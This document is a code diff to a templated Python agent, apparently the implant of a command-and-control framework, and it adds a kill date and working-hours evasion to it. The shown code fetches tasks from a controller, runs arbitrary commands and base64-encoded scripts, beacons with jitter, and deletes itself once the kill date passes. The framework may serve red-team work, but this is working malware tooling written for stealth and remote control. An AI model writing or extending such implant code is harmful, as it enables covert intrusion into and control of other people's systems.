@@ -82,7 +82,7 @@ class {class_name}:
         
         self.{v_secret_key} = None  # Will be set during registration
         self.{v_fernet} = None     # Fernet instance for encryption/decryption
-        
+
         self.{v_p2p_enabled} = {p2p_enabled}  # Configurable P2P capability
         self.{v_p2p_port} = {p2p_port}  # Configurable P2P port
         self.{v_local_agents} = {{}}  # Track local agents on network
@@ -91,7 +91,16 @@ class {class_name}:
         self.{v_p2p_command_queue} = []  # Queue for forwarded commands
 
         self.{v_sandbox_enabled} = {sandbox_check_enabled}
-        
+
+        # Working hours and kill date configurations
+        self.{v_kill_date} = "{kill_date}"
+        self.{v_working_hours} = {{
+            'start_hour': {working_hours_start_hour},
+            'end_hour': {working_hours_end_hour},
+            'timezone': "{working_hours_timezone}",
+            'days': {working_hours_days}
+        }}
+
         {dead_code_2}
 
     def {m_encrypt_data}(self, data):
@@ -681,6 +690,48 @@ class {class_name}:
 
         return False
 
+    def {m_check_working_hours}(self):
+        import datetime
+
+        now = datetime.datetime.now()
+        if self.{v_working_hours}['timezone'] == 'UTC':
+            # Use UTC time - avoid deprecated utcnow()
+            now = datetime.datetime.now(datetime.timezone.utc)
+
+        # Check if current day is in the allowed working days
+        # Python's weekday: 0=Monday, 1=Tuesday, 2=Wednesday, etc. (6=Sunday)
+        current_weekday = now.weekday() + 1  # Convert to 1-7 (Monday=1, Sunday=7)
+
+        if current_weekday not in self.{v_working_hours}['days']:
+            return False
+
+        # Check if current hour is within working hours
+        current_hour = now.hour
+        start_hour = self.{v_working_hours}['start_hour']
+        end_hour = self.{v_working_hours}['end_hour']
+
+        # Handle the case where working hours cross midnight (e.g. 22:00 to 04:00)
+        if start_hour <= end_hour:
+            # Normal case (e.g. 9:00 to 17:00)
+            return start_hour <= current_hour < end_hour
+        else:
+            # Hours cross midnight (e.g. 22:00 to 04:00)
+            return current_hour >= start_hour or current_hour < end_hour
+
+    def {m_check_kill_date}(self):
+        import datetime
+
+        try:
+            # Parse the kill date (expected format: "YYYY-MM-DDTHH:MM:SSZ" like "2025-12-31T23:59:59Z")
+            kill_datetime = datetime.datetime.strptime(self.{v_kill_date}, "%Y-%m-%dT%H:%M:%SZ")
+            kill_datetime = kill_datetime.replace(tzinfo=datetime.timezone.utc)
+
+            current_datetime = datetime.datetime.now(datetime.timezone.utc)
+            return current_datetime > kill_datetime
+        except:
+            # If we can't parse the kill date, assume no kill date (return False to not kill)
+            return False
+
     def {m_self_delete}(self):
         try:
             import atexit
@@ -1103,6 +1154,11 @@ class {class_name}:
         
         while self.{v_running}:
             try:
+                # Check kill date first
+                if self.{m_check_kill_date}():
+                    self.{m_self_delete}()
+                    return
+
                 try:
                     import platform
                     if platform.system().lower() == 'windows':
@@ -1113,22 +1169,28 @@ class {class_name}:
                             pass
                 except:
                     pass
-                
+
+                # Check if we're outside working hours
+                if not self.{m_check_working_hours}():
+                    # Sleep for 5 minutes and check again
+                    time.sleep(5 * 60)
+                    continue
+
                 check_count += 1
-                
+
                 if check_count % 3 == 0:
                     should_be_interactive = self.{m_check_interactive_status}()
                     if should_be_interactive and not self.{v_interactive_mode}:
                         self.{m_enter_interactive_mode}()
                     elif not should_be_interactive and self.{v_interactive_mode}:
                         self.{m_exit_interactive_mode}()
-                
+
                 if not self.{v_interactive_mode}:
                     tasks = self.{m_get_tasks}()
                     for task in tasks:
                         command = task.get('command', '')
                         task_id = task.get('id', 'unknown')
-                        
+
                         if command.startswith('module '):
                             try:
                                 encoded_script = command[7:]  # Remove "module " prefix
@@ -1196,16 +1258,16 @@ class {class_name}:
                             result = self.{m_exec}(command)
 
                         self.{m_submit}(task_id, result)
-                
+
                 if self.{v_interactive_mode}:
                     sleep_time = 2
                 else:
                     base_sleep = self.{v_heartbeat}
                     jitter_factor = (random.random() - 0.5) * 2 * self.{v_jitter}
                     sleep_time = max(5, base_sleep * (1 + jitter_factor))
-                
+
                 time.sleep(sleep_time)
-                
+
             except KeyboardInterrupt:
                 self.{v_running} = False
             except Exception:
